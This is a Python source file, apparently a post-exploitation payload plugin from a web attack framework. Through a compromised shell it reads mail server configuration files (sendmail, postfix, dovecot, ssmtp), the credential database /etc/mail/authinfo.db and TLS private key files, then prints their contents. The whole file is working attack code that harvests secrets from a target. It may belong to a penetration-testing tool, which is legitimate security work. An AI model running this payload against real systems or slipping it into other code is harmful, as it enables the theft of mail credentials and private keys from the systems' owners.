import re
from plugins.attack.payloads.base_payload import base_payload

class mail_config_files(base_payload):
    '''
    This payload shows mail configuration files
    '''
    def api_read(self):
        result = []
        files = []

        files.append('/etc/mail/sendmail.cf')
        files.append('/etc/mail/sendmail.mc')
        files.append('/etc/sendmail.cf')
        files.append('/var/adm/sendmail/sendmail.cf')
        files.append('/etc/mail/submit.cf')
        files.append('/etc/postfix/main.cf')
        files.append('/etc/postfix/master.cf')
        files.append('/etc/ssmtp/ssmtp.conf')
        files.append('/etc/ssmtp/revaliases')
        files.append('/etc/mail/local-host-names')
        files.append('/etc/mail/access')
        files.append('/etc/mail/authinfo.db')
        files.append('/etc/imapd.conf')
        files.append('/etc/dovecot.conf')
        files.append('/etc/dovecot/dovecot.conf')
        files.append('/etc/mail/sendmail.mc')

        files.append('/usr/share/ssl/certs/dovecot.pem')
        files.append('/usr/share/ssl/private/dovecot.pem')
        files.append('/usr/share/ssl/certs/imapd.pem')
        files.append('/etc/postfix/ssl/smtpd.pem')
        files.append('/etc/postfix/ssl/smtpd-key.pem')


        for file in files:
            if self.shell.read(file) != '':
                result.append('-------------------------')
                result.append('FILE => '+file)
                result.append(self.shell.read(file))

        result = [p for p in result if p != '']
        return result
        
    def run_read(self):
        result = self.api_read()
        if result == [ ]:
            result.append('Mail configuration files not found.')
        return result
